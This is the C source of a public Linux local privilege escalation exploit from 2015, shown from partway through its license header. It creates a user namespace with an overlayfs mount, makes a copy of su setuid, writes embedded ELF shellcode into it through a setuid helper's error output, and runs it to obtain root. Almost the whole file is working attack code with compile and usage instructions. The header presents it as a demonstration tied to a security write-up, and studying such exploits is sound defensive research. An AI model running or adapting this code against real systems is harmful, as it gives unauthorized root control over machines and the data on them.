 *  liable for any direct, indirect, incidential, special, exemplary or
 *  consequential damages, including, but not limited to, procurement
 *  of substitute goods or services, loss of use, data or profits or
 *  business interruption, however caused and on any theory of liability,
 *  whether in contract, strict liability, or tort, including negligence
 *  or otherwise, arising in any way out of the use of this software,
 *  even if advised of the possibility of such damage.
 *
 *  Copyright (c) 2015 halfdog <me (%) halfdog.net>
 *
 *  This program demonstrates how to escalate privileges using
 *  an overlayfs mount within a user namespace. See
 *  http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
 *  for more information.
 *
 *  gcc -o UserNamespaceOverlayfsSetuidWriteExec UserNamespaceOverlayfsSetuidWriteExec.c
 *
 *  Usage: UserNamespaceOverlayfsSetuidWriteExec -- [program] [args]
 *
 */
  
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <unistd.h>
  
extern char **environ;
  
static int childFunc(void *arg) {
  fprintf(stderr, "euid: %d, egid: %d\n", geteuid(), getegid());
  while(geteuid()!=0) {
    usleep(100);
  }
  fprintf(stderr, "euid: %d, egid: %d\n", geteuid(), getegid());
  
  int result=mount("overlayfs", "/tmp/x/bin", "overlayfs", MS_MGC_VAL, "lowerdir=/bin,upperdir=/tmp/x/over,workdir=/tmp/x/bin");
  if(result) {
    fprintf(stderr, "Overlay mounting failed: %d (%s)\n", errno, strerror(errno));
    return(1);
  }
  chdir("/tmp/x/bin");
  result=chmod("su", 04777);
  if(result) {
    fprintf(stderr, "Mode change failed\n");
    return(1);
  }
  
  fprintf(stderr, "Namespace helper waiting for modification completion\n");
  struct stat statBuf;
  char checkPath[128];
  sprintf(checkPath, "/proc/%d", getppid());
  while(1) {
    usleep(100);
    result=stat(checkPath, &statBuf);
  
    if(result) {
      fprintf(stderr, "Namespacer helper: parent terminated\n");
      break;
    }
// Wait until parent has escalated.
    if(statBuf.st_uid) break;
  }
  
  chdir("/");
  umount("/tmp/x/bin");
  unlink("/tmp/x/over/su");
  rmdir("/tmp/x/over");
  rmdir("/tmp/x/bin/work");
  rmdir("/tmp/x/bin");
  rmdir("/tmp/x/");
  fprintf(stderr, "Namespace part completed\n");
  
  return(0);
}
  
  
#define STACK_SIZE (1024 * 1024)
static char child_stack[STACK_SIZE];
  
int main(int argc, char *argv[]) {
  int argPos;
  int result;
  char *targetSuidPath="/bin/su";
  char *helperSuidPath="/bin/mount";
  
  for(argPos=1; argPos<argc; argPos++) {
    char *argName=argv[argPos];
    if(!strcmp(argName, "--")) {
      argPos++;
      break;
    }
    if(strncmp(argName, "--", 2)) {
      break;
    }
  
    fprintf(stderr, "%s: unknown argument %s\n", argv[0], argName);
    exit(1);
  }
  
  mkdir("/tmp/x", 0700);
  mkdir("/tmp/x/bin", 0700);
  mkdir("/tmp/x/over", 0700);
  
// Create child; child commences execution in childFunc()
// CLONE_NEWNS: new mount namespace
// CLONE_NEWPID
// CLONE_NEWUTS
  pid_t pid=clone(childFunc, child_stack+STACK_SIZE,
      CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, argv+argPos);
  if(pid==-1) {
    fprintf(stderr, "Clone failed: %d (%s)\n", errno, strerror(errno));
    return(1);
  }
  
  char idMapFileName[128];
  char idMapData[128];
  
  sprintf(idMapFileName, "/proc/%d/setgroups", pid);
  int setGroupsFd=open(idMapFileName, O_WRONLY);
  if(setGroupsFd<0) {
    fprintf(stderr, "Failed to open setgroups\n");
    return(1);
  }
  result=write(setGroupsFd, "deny", 4);
  if(result<0) {
    fprintf(stderr, "Failed to disable setgroups\n");
    return(1);
  }
  close(setGroupsFd);
  
  sprintf(idMapFileName, "/proc/%d/uid_map", pid);
  fprintf(stderr, "Setting uid map in %s\n", idMapFileName);
  int uidMapFd=open(idMapFileName, O_WRONLY);
  if(uidMapFd<0) {
    fprintf(stderr, "Failed to open uid map\n");
    return(1);
  }
  sprintf(idMapData, "0 %d 1\n", getuid());
  result=write(uidMapFd, idMapData, strlen(idMapData));
  if(result<0) {
    fprintf(stderr, "UID map write failed: %d (%s)\n", errno, strerror(errno));
    return(1);
  }
  close(uidMapFd);
  
  sprintf(idMapFileName, "/proc/%d/gid_map", pid);
  fprintf(stderr, "Setting gid map in %s\n", idMapFileName);
  int gidMapFd=open(idMapFileName, O_WRONLY);
  if(gidMapFd<0) {
    fprintf(stderr, "Failed to open gid map\n");
    return(1);
  }
  sprintf(idMapData, "0 %d 1\n", getgid());
  result=write(gidMapFd, idMapData, strlen(idMapData));
  if(result<0) {
    fprintf(stderr, "GID map write failed: %d (%s)\n", errno, strerror(errno));
    return(1);
  }
  close(gidMapFd);
  
// Wait until /tmp/x/over/su exists
  struct stat statBuf;
  while(1) {
    usleep(100);
    result=stat("/tmp/x/over/su", &statBuf);
    if(!result) break;
  }
  
// Overwrite the file
  sprintf(idMapFileName, "/proc/%d/cwd/su", pid);
  
// No slashes allowed, everything else is OK.
  char suidExecMinimalElf[] = {
      0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
      0x80, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0xf8, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x02, 0x00, 0x28, 0x00,
      0x05, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xa2, 0x00, 0x00, 0x00,
      0xa2, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
      0x01, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x00, 0xa4, 0x90, 0x04, 0x08,
      0xa4, 0x90, 0x04, 0x08, 0x09, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
      0x06, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x89, 0xc8,
      0x89, 0xd0, 0x89, 0xd8, 0x04, 0xd2, 0xcd, 0x80, 
  
      0x31, 0xc0, 0x04, 0xd0, 0xcd, 0x80,
  
      0x31, 0xc0, 0x89, 0xd0,
      0xb0, 0x0b, 0x89, 0xe1, 0x83, 0xc1, 0x08, 0x8b, 0x19, 0xcd, 0x80
  };
  char *helperArgs[]={"/bin/mount", NULL};
  
  int destFd=open(idMapFileName, O_RDWR|O_CREAT|O_TRUNC, 07777);
  if(destFd<0) {
    fprintf(stderr, "Failed to open %s, error %s\n", idMapFileName, strerror(errno));
    return(1);
  }
  
  char *suidWriteNext=suidExecMinimalElf;
  char *suidWriteEnd=suidExecMinimalElf+sizeof(suidExecMinimalElf);
  while(suidWriteNext!=suidWriteEnd) {
    char *suidWriteTestPos=suidWriteNext;
    while((!*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
      suidWriteTestPos++;
// We cannot write any 0-bytes. So let seek fill up the file wihh
// null-bytes for us.
    lseek(destFd, suidWriteTestPos-suidExecMinimalElf, SEEK_SET);
    suidWriteNext=suidWriteTestPos;
    while((*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
      suidWriteTestPos++;
  
    pid_t helperPid=fork();
    if(!helperPid) {
      struct rlimit limits;
  
// We can't truncate, that would remove the setgid property of
// the file. So make sure the SUID binary does not write too much.
      limits.rlim_cur=suidWriteTestPos-suidExecMinimalElf;
      limits.rlim_max=limits.rlim_cur;
      setrlimit(RLIMIT_FSIZE, &limits);
  
// Do not rely on some SUID binary to print out the unmodified
// program name, some OSes might have hardening against that.
// Let the ld-loader will do that for us.
      limits.rlim_cur=1<<22;
      limits.rlim_max=limits.rlim_cur;
      result=setrlimit(RLIMIT_AS, &limits);
  
      dup2(destFd, 1);
      dup2(destFd, 2);
      helperArgs[0]=suidWriteNext;
      execve(helperSuidPath, helperArgs, NULL);
      fprintf(stderr, "Exec failed\n");
      return(1);
    }
    waitpid(helperPid, NULL, 0);
    suidWriteNext=suidWriteTestPos;
  }
  close(destFd);
  execve(idMapFileName, argv+argPos-1, NULL);
  fprintf(stderr, "Failed to execute %s: %d (%s)\n", idMapFileName,
      errno, strerror(errno));
  return(1);
}
 
